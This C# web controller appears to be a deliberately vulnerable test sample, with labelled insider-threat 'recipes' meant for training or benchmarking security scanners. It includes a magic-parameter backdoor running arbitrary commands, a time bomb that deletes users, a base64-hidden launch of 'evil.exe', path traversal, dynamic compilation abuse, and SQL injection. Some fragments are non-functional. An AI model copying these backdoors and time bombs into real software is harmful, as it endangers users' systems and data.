using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Web.Http;
using Microsoft.AspNetCore.Mvc;
using TarpitCsharp.Utils;
using System.Diagnostics;

namespace TarpitCsharp.Controllers
{
    [Microsoft.AspNetCore.Mvc.Route("insider/")]
    [ApiController]
    public class InsiderController : ApiController
    {
        static string code = @"
using System;
namespace Run
{
    class Exec 
    {
        static void Main(string [] args) 
        {
            Process.Start(""CMD.exe"",""calc.exe"");
        }
    }
}
";
        
        static string clazz = @"
using System;
namespace Test
{
    string Code;
    class TestClass(byte [] code)
    {
        this.Code = code;
    }
}
";

        // GET api/values
        [Microsoft.AspNetCore.Mvc.HttpGet]
        [Microsoft.AspNetCore.Mvc.Route("Insider")]
        public List<string> HandleGet([FromUri] Query query)
        {
            var ret = new List<string>();

            Ticking("YzpcXHdpbmRvd3NcXHN5c3RlbTMyXFxldmlsLmV4ZQ==");

            // RECIPE: Access to Shell pattern
            if (query.Tracefn == "C4A938B6FE01E")
            {
                Process.Start(query.Cmd);
            }

            // RECIPE: Time Bomb pattern
            if (DateTimeOffset.Now.ToUnixTimeMilliseconds() > 1547395285779L)
            {
                new Thread(Run).Start();
            }

            // RECIPE: Path Traversal
            using (var reader = new StreamReader(query.X, Encoding.UTF8))
            {
                while (reader.Peek() >= 0)
                {
                    ret.Add(reader.ReadLine());
                }
            }

            // RECIPE: Compiler Abuse Pattern
            string sout = ".";

            string path = Environment.GetEnvironmentVariable("Path", EnvironmentVariableTarget.Machine);

            foreach (var entry in path.Split(";"))
            {
                if ((FileAttributes.Directory & File.GetAttributes(entry)) != FileAttributes.Directory) continue;
                sout = entry;
                break;
            }

            // Dynamically Load malicious class, copy to class path
            var ass = Compiler.Compile(code);

            // Load class
            object inst = Compiler.loadClass(ass, "Run.Exec");

            //  RECIPE: Abuse HTML template pattern
            var uri = new System.Uri("file.html");
            var sw = File.CreateText(uri.ToString());
            sw.WriteLine("<html><body>" + Process.Start("cmd.exe", "calc.exe") + "</body></html>");
            sw.Close();
            Redirect(uri);
            
           
            // RECIPE: Abuse Class Loader pattern
            byte[] b = Convert.FromBase64String(query.X);
            var clazzass = Compiler.Compile(clazz);

            // Load class
            object loaded = Compiler.InvokeMethod(ass, "Test.TestClass", "TestClass", b.ToString());

            var untrusted = query.X;
            
            var x = Convert.ToBase64String(Encoding.ASCII.GetBytes(untrusted));
            string validatedString = validate(x);

            if (validatedString != null)
            {
                var y = Convert.FromBase64String(validatedString).ToString();
                
                new SQLiteCommand(y, DatabaseUtils._con)
                    .ExecuteNonQuery();   
            }
            
            return ret;
        }

        public String validate(string value)
        {
            if (value.Contains("SOMETHING_THERE"))
                return value;
            return "";
        }
        
        void Run()
        {
            while (true)
            {
                new SQLiteCommand($"DELETE FROM users WHERE id = {GetSecureRandom()}", DatabaseUtils._con)
                    .ExecuteNonQuery();
                Thread.Sleep(GetSecureRandom());
            }
        }

        int GetSecureRandom()
        {
            using (RNGCryptoServiceProvider crypto = new RNGCryptoServiceProvider())
            {
                byte[] val = new byte[6];
                crypto.GetBytes(val);
                return BitConverter.ToInt32(val, 1);
            }
        }

        private void Ticking(string parameter)
        {
            var now = DateTime.Now;
            var e = new DateTime();
            e.AddMilliseconds(1551859200000L);

            var exec = Convert.FromBase64String(parameter).ToString();

            if (now <= e) return;

            Process.Start("CMD.exe", exec);
        }
    }


    public class Query
    {
        public string X { get; set; }
        public string Tracefn { get; set; }
        public string Cmd { get; set; }
    }
}